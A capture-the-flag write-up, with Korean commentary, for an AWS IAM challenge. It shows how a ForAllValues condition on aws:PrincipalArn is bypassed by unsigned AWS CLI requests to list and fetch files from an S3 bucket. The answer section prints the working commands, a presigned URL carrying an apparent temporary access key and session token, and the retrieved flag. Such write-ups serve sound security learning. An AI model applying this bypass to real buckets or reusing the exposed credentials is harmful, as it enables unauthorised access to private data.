# Q.

We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

# A.

```
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
2023-06-07 19:15:43         42 flag-as-admin.txt
2023-06-08 19:20:01      81889 logo-admin.png

> aws s3 presign s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt --no-sign-request
https://thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com/files/flag-as-admin.txt?AWSAccessKeyId=ASIAZSFITKRS64HXSGAE&Signature=QOkfEPGbV4R%2BSiEZ1jJOGFVGH5k%3D&x-a
mz-security-token=IQoJb3JpZ2luX2VjEH8aCXVzLWVhc3QtMSJGMEQCIGe0t4eNwnzfgV4NFrP2KIpvb%2BAliAAdBAjB7WScIkuQAiA44luuToe2tCCJHoYNhh6z848n7n%2FiTYVagzY9SrsYZyrvAgjY%2F%2F%2F%2F%2
F%2F%2F%2F%2F%2F8BEAAaDDY1NzQ4MzU4NDYxMyIMIdHEl7kAhyE39AOaKsMCNa0dfq%2Bt2LIKXNBEUZJCRv9a5IUqqszMoi%2Bdb2%2BSa6ZJIrRy5EeMQQ2n9Ny4Iq5gPBkNBbJjsH7cwjRW%2B1x0Ls1gJnGmxQ8Hk%2FY%
2B8Ww8zor13sKTG98za9KYIwe4h4vDyvo1jPt4K4jgByluSPIVe006H8Auev5CcOyukAvKC7ReD475WjSnJdPj2lg4zdireteYnC99CZ1AiCRj8gnfbcCvJX91CZfiGP5RvPyXifloLr8VT8lby7%2FolhYcibf7x1yjNGbTkWlL
e0f3sNpkSk%2BWMEPxLxWtQgpzeKOtOSXWXWwTQUf6BwOou7q2wXuxfqMn3pb%2FMrseO7zvkTgeXKP%2Bj8dlaSF%2FPsa6arACS%2Bd1RNN6YkSsRygZrD3W2l0f0dlzWLowFdy5VopSpgSAE0YKPRynEE1n4MhUoVcTaweAyb
gwx%2BK0uAY6nwG%2BDL%2FxwpI1y9TogjJ5FvasTbxOnzUtb%2BySr0mfgCuHeLOl5QUbQ3sC8Hx5iWo1QYSAONQIQ0SvFstFint5VTvMK0S5vrQJV77Lp9wv6TbqCkD9ne9urjIauN324%2Fktr0%2BszqlbpzUAD72ZI%2Bsn
fx02OkOVu6Wewe4zZbv9D2Va4NTM0hYg2WJxW0EeV8aM6G64HgfwB3Q%2FgD9IqUk93ng%3D&Expires=1728923150

> curl https://thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com/files/flag-as-admin.txt?AWSAccessKeyId=ASIAZSFITKRS64HXSGAE&Signature=QOkfEPGbV4R%2BSiEZ1jJOGFVGH5k
%3D&x-a
mz-security-token=IQoJb3JpZ2luX2VjEH8aCXVzLWVhc3QtMSJGMEQCIGe0t4eNwnzfgV4NFrP2KIpvb%2BAliAAdBAjB7WScIkuQAiA44luuToe2tCCJHoYNhh6z848n7n%2FiTYVagzY9SrsYZyrvAgjY%2F%2F%2F%2F%2
F%2F%2F%2F%2F%2F8BEAAaDDY1NzQ4MzU4NDYxMyIMIdHEl7kAhyE39AOaKsMCNa0dfq%2Bt2LIKXNBEUZJCRv9a5IUqqszMoi%2Bdb2%2BSa6ZJIrRy5EeMQQ2n9Ny4Iq5gPBkNBbJjsH7cwjRW%2B1x0Ls1gJnGmxQ8Hk%2FY%
2B8Ww8zor13sKTG98za9KYIwe4h4vDyvo1jPt4K4jgByluSPIVe006H8Auev5CcOyukAvKC7ReD475WjSnJdPj2lg4zdireteYnC99CZ1AiCRj8gnfbcCvJX91CZfiGP5RvPyXifloLr8VT8lby7%2FolhYcibf7x1yjNGbTkWlL
e0f3sNpkSk%2BWMEPxLxWtQgpzeKOtOSXWXWwTQUf6BwOou7q2wXuxfqMn3pb%2FMrseO7zvkTgeXKP%2Bj8dlaSF%2FPsa6arACS%2Bd1RNN6YkSsRygZrD3W2l0f0dlzWLowFdy5VopSpgSAE0YKPRynEE1n4MhUoVcTaweAyb
gwx%2BK0uAY6nwG%2BDL%2FxwpI1y9TogjJ5FvasTbxOnzUtb%2BySr0mfgCuHeLOl5QUbQ3sC8Hx5iWo1QYSAONQIQ0SvFstFint5VTvMK0S5vrQJV77Lp9wv6TbqCkD9ne9urjIauN324%2Fktr0%2BszqlbpzUAD72ZI%2Bsn
fx02OkOVu6Wewe4zZbv9D2Va4NTM0hYg2WJxW0EeV8aM6G64HgfwB3Q%2FgD9IqUk93ng%3D&Expires=1728923150
{wiz:principal-arn-is-not-what-you-think}
```

# 풀이 설명

[다중 값 컨텍스트 키](https://docs.aws.amazon.com/ko_kr/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys)

> ForAllValues : 요청 집합의 모든 멤버 값이 조건 컨텍스트 키 집합의 하위 집합인지 여부를 테스트합니다. 요청의 모든 컨텍스트 키 값이 정책에 있는 하나 이상의 컨텍스트 키 값과 일치하면 조건이 true를 반환합니다. **요청에 컨텍스트 키가 없거나 컨텍스트 키 값이 빈 문자열과 같은 null 데이터세트로 확인되는 경우에도 true를 반환합니다.** ...

> --no-sign-request : 해당 버킷에 퍼블릭 액세스가 가능할때 인증없이 접근 가능

- `ForAllValues`의 경우 값이 없는 경우 true로 되는 허점을 이용해서 `--no-sign-request` 옵션으로 인증(principal)을 무시할 수 있다.  
  `--no-sign-request`는 알았는데 이걸 `ForAllValues`의 경우에서 함께 사용해서 보안취약점을 노린다는게 너무 신기하다.
